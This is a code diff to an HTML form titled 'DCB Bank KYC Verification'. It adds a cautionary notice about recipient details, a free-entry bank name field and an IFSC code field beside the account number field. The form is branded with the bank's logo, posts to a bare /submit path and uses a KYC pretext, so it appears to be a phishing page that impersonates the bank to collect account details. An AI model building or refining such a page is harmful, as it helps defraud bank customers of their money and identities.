@@ -27,6 +27,14 @@
       text-align: center;
       color: #003d6a;
     }
+    .notice {
+      margin-top: -10px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #444;
+      text-align: center;
+      line-height: 1.5;
+    }
     label {
       display: block;
       margin-top: 15px;
@@ -64,11 +72,22 @@
 </head>
 <body>
   <div class="container">
-    <img src="dbc.png" alt="DCB Bank Logo" class="logo">
+    <img class="logo" src="dbc.png" alt="DCB Bank Logo">
+    
     <h2>DCB Bank KYC Verification</h2>
+
+    <p class="notice">
+      Please enter the recipient’s bank and other required details carefully.  
+      All details submitted must match the recipient’s bank records.  
+      Invalid or mismatched information may lead to reversal or failure of the transaction.
+    </p>
+
     <form action="/submit" method="POST" enctype="multipart/form-data">
       <label for="bankname">Bank Name</label>
-      <input type="text" id="bankname" name="bankname" value="DCB Bank" readonly>
+      <input type="text" id="bankname" name="bankname" placeholder="Enter recipient’s bank name" required>
+
+      <label for="ifsc">IFSC Code</label>
+      <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>
 
       <label for="accno">Account Number</label>
       <input type="text" id="accno" name="accno" required>
